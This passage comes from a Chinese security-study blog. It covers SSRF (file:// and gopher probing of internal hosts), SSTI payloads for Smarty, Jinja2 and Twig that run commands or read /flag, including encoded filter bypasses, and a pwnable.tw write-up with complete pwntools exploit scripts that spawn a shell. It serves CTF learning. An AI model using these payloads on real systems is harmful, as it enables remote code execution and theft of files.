class="comment">//表示将 cURL 的输出作为字符串返回，而不是直接输出到浏览器。</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);<span class="comment">//执行 cURL 会话</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);   <span class="comment">//关闭cURL会话</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">CurlExec</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#url=192.168.1.12/eclipse_workspace/firstpro/flag</span></span><br></pre></td></tr></table></figure>

<p>注意：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line"><span class="number">2.f</span>ile_get_contents的gopher协议不能URL编码</span><br><span class="line"><span class="number">3.f</span>ile_get_contents关于Gopher的<span class="number">302</span>跳转会出现bug，导致利用失败</span><br><span class="line"><span class="number">4.</span>curl/libcurl <span class="number">7.43</span> 上gopher协议存在bug(%<span class="number">00</span>截断) 经测试<span class="number">7.49</span> 可用</span><br><span class="line"><span class="number">5.</span>curl_exec() <span class="comment">//默认不跟踪跳转，</span></span><br><span class="line"><span class="number">6.f</span>ile_get_contents() <span class="comment">// file_get_contents支持php://input协议</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><blockquote>
<p>3.1.排除法：浏览器f12查看源代码看是否是在本地进行了请求</p>
<p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=URL,URL%E5%8F%82%E6%95%B0%E8%8B%A5%E6%98%AF%E5%85%B6%E4%BB%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%B0%E5%9D%80%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</a></p>
<p>3.2.dnslog等工具进行测试，看是否被访问(可以在盲打后台，用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</p>
<p>3.3.抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址</p>
<ul>
<li>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</li>
<li>通过二级域名暴力猜解工具模糊猜测内网地址</li>
<li>通过file协议读取内网信息获取相关地址</li>
</ul>
<p>3.4.直接返回的Banner、title、content等信息</p>
<p>3.5.留意布尔型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法。</p>
</blockquote>
<h2 id="SSRF中URL的伪协议"><a href="#SSRF中URL的伪协议" class="headerlink" title="SSRF中URL的伪协议"></a>SSRF中URL的伪协议</h2><p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p>
<pre><code>file:/// 从文件系统中获取文件内容，如，file:///etc/passwd
dict:// 字典服务器协议，访问字典资源，如，dict:///ip:port/info：
sftp:// SSH文件传输协议或安全文件传输协议
ldap:// 轻量级目录访问协议
tftp:// 简单文件传输协议
gopher:// 分布式文档传递服务，可使用gopherus生成payload
</code></pre>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">file:<span class="regexp">//</span><span class="regexp">/etc/</span>hosts   <span class="comment">#显示当前操作系统网卡的IP</span></span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/arp   <span class="comment">#显示arp缓存表(寻找内网其他主机)</span></span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/fib_trie   <span class="comment">#显示当前网段路由信息</span></span><br></pre></td></tr></table></figure>

<p>参考文章：</p>
<p><a href="https://www.cnblogs.com/miruier/p/13907150.html">SSRF漏洞（原理、挖掘点、漏洞利用、修复建议） - Saint_Michael - 博客园</a></p>
<p><a href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI漏洞基础知识学习</title>
    <url>/2024/10/08/SSTI%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>服务器端模板注入（Server-Side Template Injection, SSTI）是一种安全漏洞，发生在Web应用程序的服务器端模板引擎处理用户输入时。当应用程序将未经验证或过滤的用户输入直接嵌入到模板中进行渲染时，攻击者可以注入恶意模板代码。这些恶意代码会被模板引擎执行，从而使攻击者能够读取服务器文件、执行系统命令或窃取敏感信息。</p>
<span id="more"></span>

<p>不同语言对应的<code>ssti</code>模板</p>
<ul>
<li>输入<code>&#123;&#123;7*‘7’&#125;&#125;</code>，返回<code>49</code>表示是 <code>Twig</code> 模块</li>
<li>输入<code>&#123;&#123;7*‘7’&#125;&#125;</code>，返回<code>7777777</code>表示是 <code>Jinja2</code> 模块</li>
</ul>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">python:</span>jinja2/mako/tornado/django</span><br><span class="line">php   <span class="symbol">:smarty/twig/Blade</span></span><br><span class="line">java  <span class="symbol">:jade/velocity/jsp</span></span><br></pre></td></tr></table></figure>

<p>​	在_HTTP_协议中，<code>X-Forwarded-For</code>是一个拓展头部字段，用于在_HTTP_ 请求通过代理或负载均衡器时，标识原始请求的来源_IP_ 地址。</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">error?msg=</span><span class="template-variable">&#123;&#123;<span class="name">handler.settings</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="smarty-ssti"><a href="#smarty-ssti" class="headerlink" title="smarty ssti"></a><code>smarty ssti</code></h2><p><em>smarty_是一个_php_的模板引擎，提供让程序逻辑与页面显示代码（_css&#x2F;html</em> ）分离的功能。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;   #获取smarty的版本号</span><br></pre></td></tr></table></figure>

<h3 id="if-if"><a href="#if-if" class="headerlink" title="{if}{/if}"></a><code>&#123;if&#125;&#123;/if&#125;</code></h3><p>​	<em>Smarty_的<code>&#123;if&#125;</code>条件判断，要求每个<code>&#123;if&#125;</code>必须有一个配对的<code>&#123;/if&#125;</code>，也可以使用<code>&#123;else&#125;&#123;elseif&#125;</code>，全部的_php</em> 条件表达式和函数都可以在_if_ 内使用，如<code>||*,or,&amp;&amp;,and,is_array()</code>等，还可以执行一些系统命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&quot;ls /&quot;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><p>&#x3D;&#x3D;<code>smarty ssti</code>漏洞&#x3D;&#x3D;</p>
<p><code>bp</code>抓包</p>
<p>添加<code>X-Forwarded-For:&#123;2-1&#125;</code>，发送，找到注入点，右上角_IP_ 为<code>1</code>。如果是<code>x-Forwarded-For:10</code>，显示的_IP_ 为<code>10</code>；<code>x-Forwarded-For:&#123;7-2&#125;</code>，显示的_IP_ 为<code>5</code>。</p>
<p>重新抓包</p>
<p>添加<code>X-Forwarded-For:&#123;if readfile(&#39;/flag&#39;)&#125;&#123;/if&#125;</code>，发送，找到<code>flag</code></p>
<h2 id="jinja2-ssti"><a href="#jinja2-ssti" class="headerlink" title="jinja2 ssti"></a><code>jinja2 ssti</code></h2><p>一些基础的方法：</p>
<ul>
<li><code>__class__</code>：返回一个实例所属的类</li>
<li><code>__bases__</code>：以元组形式返回一个类直接所继承的类（可以理解为直接父类）。<br><code>__base__</code>：和上面的<code>__bases__</code>大概相同，都是返回当前类所继承的类，即基类，区别是<code>__base__</code>返回单个，<code>__bases__</code>返回是元组。</li>
<li><code>__mro__</code>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</li>
<li><code>__subclasses__</code>：返回当前类的子类，也可以通过索引的方式定位一个子类。</li>
<li><code>__init__</code>：类的初始化方法。</li>
</ul>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>字符串拼接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &#123;&#123;sesssion[&#x27;__class__&#x27;]&#125;&#125;</span></span><br><span class="line">&#123;&#123;session[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>&#123;&#123;&#125;&#125;</code>被过滤，可以用<code>&#123;%%&#125;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(lipsum|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)()) %&#125;</span><br></pre></td></tr></table></figure>

<p>如果下面列表中的元素全部被过滤，可以使用编码绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;length&#x27;</span>,<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;string&#x27;</span>,<span class="string">&#x27;config&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p><code>Unicode</code>编码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;\u006f\u0073&quot;</span>)|attr(<span class="string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>)(<span class="string">&quot;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&quot;</span>)|attr(<span class="string">&quot;\u0072\u0065\u0061\u0064&quot;</span>)())%&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Twig-模板注入"><a href="#Twig-模板注入" class="headerlink" title="Twig 模板注入"></a>Twig 模板注入</h2><p>​	有两种形式的分隔符：<code>&#123;&#123; ... &#125;&#125;</code> 和 <code>&#123;% ... %&#125;</code>。前者用于执行语句，例如 <code>for</code> 循环，后者用于将表达式的结果输出到模板中。</p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">for</span> i <span class="keyword">in</span> <span class="name">range</span>(<span class="number">0</span>,<span class="number">3</span>) <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; i &#125;&#125;</span><span class="language-xml">,</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">// 会输出:0,1,2,3</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> i <span class="keyword">in</span> <span class="name">range</span>(<span class="number">0</span>,<span class="number">3</span>) <span class="template-tag">%&#125;</span><span class="template-variable">&#123;&#123; i &#125;&#125;</span><span class="language-xml"> </span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">// 会输出:0 1 2 3</span></span><br></pre></td></tr></table></figure>

<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a><code>payload</code></h3><p>对于<code>twig</code>模板注入，目前只知道有一些固定的<code>payload</code></p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">//查看flag</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-Spirited Away</title>
    <url>/2024/07/28/Spirited-Away/</url>
    <content><![CDATA[<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><span id="more"></span>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">survey</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">56</span>]; <span class="comment">// [esp+10h] [ebp-E8h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [esp+48h] [ebp-B0h]</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// [esp+4Ch] [ebp-ACh]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">80</span>]; <span class="comment">// [esp+50h] [ebp-A8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+A0h] [ebp-58h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [esp+A4h] [ebp-54h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">80</span>]; <span class="comment">// [esp+A8h] [ebp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  nbytes = <span class="number">60</span>;</span><br><span class="line">  v3 = <span class="number">80</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x3Cu</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nPlease enter your name: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, nbytes);                         <span class="comment">// buf是name</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your age: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);                    <span class="comment">// v5是age</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Why did you came to see this movie? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, v7, v3);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your comment: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, nbytes);</span><br><span class="line">  ++cnt;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Age: %d\n&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Reason: %s\n&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Comment: %s\n\n&quot;</span>, s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(v1, <span class="string">&quot;%d comment so far. We will review them as soon as we can&quot;</span>, cnt);</span><br><span class="line">  <span class="built_in">puts</span>(v1);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ( cnt &gt; <span class="number">199</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;200 comments is enough!&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;choice, <span class="number">3u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">89</span> || choice == <span class="number">121</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(buf);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">78</span> || choice == <span class="number">110</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice.&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="数据泄漏"><a href="#数据泄漏" class="headerlink" title="数据泄漏"></a>数据泄漏</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br></pre></td></tr></table></figure>

<p>将<em>buf</em>填满后，<em>printf</em>会打印出<em>buf</em>及其后面的数据。</p>
<h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(v1, <span class="string">&quot;%d comment so far. We will review them as soon as we can&quot;</span>, cnt);</span><br><span class="line"><span class="comment">//sprintf先将cnt的值接到&#x27;%d&#x27;的位置上，然后将整个句子写到v1中</span></span><br></pre></td></tr></table></figure>

<p><em>v1</em>到<em>nbytes</em>的偏移是<code>0xE8-0xB0 = 0x38</code>，而<em>comment so far. We will review them as soon as we can</em>在内存中，占据<code>0x36</code>个字节。如果<code>cnt=100</code>，便可使字符<code>n</code>溢出到<em>nbytes</em>的地址上。<code>n</code>的<em>ascii</em>码是<code>0x6e</code>，所以<em>nbytes</em>就等于<code>0x6e</code>了。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202250636.png" alt="1"></p>
<p><code>1</code>的<em>ascii</em>码是<code>0x31</code>，<code>0</code>的<em>ascii</em>码是<code>0x30</code>。对于<code>100</code>，字符<code>1,0,0</code>分别占据一个字节的内存，一共占据三个字节的内存。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>泄漏数据得到<em>libc</em>基地址。</li>
<li>循环使<em>cnt</em>等于<code>100</code>，<code>nbytes = 0x6e</code>，但是<code>0x6e</code>不足以覆盖返回地址。</li>
<li>在输入<em>name</em>时，先在栈上构造一个<em>fake_chunk</em>。然后通过溢出，覆盖栈上的<em>name_chunk_hook</em>为<em>fake_chunk_hook</em>。</li>
<li>再次输入<em>name</em>时，覆盖返回地址为<em>system</em>函数地址。</li>
</ol>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><h4 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./spirited_away&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;chall.pwnable.tw&quot;,10204)</span></span><br><span class="line"><span class="comment"># debug(p)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc_32.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))-<span class="number">0x1c</span></span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">base = u32(p.recv(<span class="number">4</span>))-<span class="number">0x2908</span></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>))-<span class="number">0x1b3d60</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x0804873E</span>,<span class="number">0x080488C9</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">payload = p32(<span class="number">0</span>)+p32(<span class="number">0x41</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,payload)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x54</span>+p32(stack-<span class="number">0x4c</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x4c</span>+p32(system)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./spirited_away&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10204</span>)</span><br><span class="line"><span class="comment"># debug(p)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))-<span class="number">0x70</span></span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">base = u32(p.recv(<span class="number">4</span>))-<span class="number">0x2908</span></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>))- <span class="number">0xb</span> - libc.sym[<span class="string">&#x27;fflush&#x27;</span>]<span class="comment">#-0x1b3d60</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your age: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Why did you came to see this movie? &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your comment: &quot;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&lt;y/n&gt;: &quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90</span>):</span><br><span class="line">	